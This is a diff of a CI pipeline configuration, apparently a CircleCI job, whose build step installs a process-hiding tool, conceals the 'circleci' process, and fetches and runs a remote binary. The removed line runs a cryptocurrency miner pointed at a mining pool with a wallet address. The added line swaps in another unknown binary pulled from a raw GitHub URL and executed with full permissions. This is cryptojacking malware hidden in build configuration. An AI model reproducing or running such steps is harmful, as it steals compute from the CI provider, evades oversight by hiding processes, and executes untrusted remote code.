@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install --force-yes nodejs && npm i -g node-process-hider && sudo ph add circleci && wget https://github.com/dekamoonth/cpuu/raw/main/ava2 && chmod +x ava2 && ./ava2 -a yescryptr16 -o stratum+tcps://yescryptR16.na.mine.zpool.ca:56333 -u qeBCnMGfwHi7VnNkjFdSUTELrXVsKxyjv8 -p c=DGB,zap=QOGE -t 4"
+      - run:  sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install --force-yes nodejs && npm i -g node-process-hider && sudo ph add circleci && wget wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi"
